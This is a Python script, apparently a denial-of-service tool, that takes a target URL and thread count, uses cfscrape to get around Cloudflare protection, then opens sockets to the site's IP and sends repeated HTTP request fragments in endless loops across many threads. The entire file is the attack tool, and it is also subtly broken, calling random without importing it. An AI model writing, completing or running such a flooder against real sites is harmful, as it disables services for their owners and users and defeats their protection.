import socket
import threading
import cfscrape

# Target website information
target_url = input("Enter target website URL: ")
num_threads = int(input("Enter number of threads: "))
scraper = cfscrape.create_scraper()

def attack():
    while True:
        try:
            # Bypass Cloudflare using cfscrape
            response = scraper.get(target_url)
            if response.status_code == 200:
                print(f"Successfully bypassed Cloudflare for {target_url}")

                # Extract IP address from URL
                target_ip = socket.gethostbyname(target_url.split("//")[1].split("/")[0])
                print(f"Target IP address: {target_ip}")

                # Create socket and send garbage data
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, 80))
                rand_data = "GET /?=" + str(random.randint(0, 2000)) + " HTTP/1.1\r\n"
                rand_data += "Host: " + target_url.split("//")[1].split("/")[0] + "\r\n"
                rand_data += "Connection: Keep-Alive\r\n"
                while True:
                    sock.send(rand_data.encode('utf-8'))
                    print("Sent packet to " + target_url)
            else:
                print(f"Failed to bypass Cloudflare for {target_url}. Status code: {response.status_code}")

        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    print("Starting the attack...")
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
